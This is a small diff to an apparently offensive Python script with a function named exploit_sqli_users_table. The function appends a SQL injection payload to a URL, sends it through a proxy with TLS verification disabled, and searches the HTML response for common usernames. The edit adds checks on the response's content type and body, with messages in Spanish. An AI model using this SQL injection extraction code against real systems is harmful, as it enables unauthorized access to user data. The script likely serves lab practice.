@@ -73,7 +73,15 @@ def exploit_sqli_users_table(url):
     r = requests.get(url + sql_payload, verify=False, proxies=proxies)
     # res = r.text
     
-    soup = BeautifulSoup(r.text, 'html.parser')
+    if "text/html" in r.headers.get("Content-Type", ""):
+        soup = BeautifulSoup(r.text, 'html.parser')
+    else:
+        print("[-] La respuesta no es de tipo HTML.")
+        return False
+    
+    if not soup.body:
+        print("[-] No se pudo encontrar el cuerpo HTML en la respuesta.")
+        return False
     
     for username in common_usernames:
         user_element = soup.body.find(string=username)
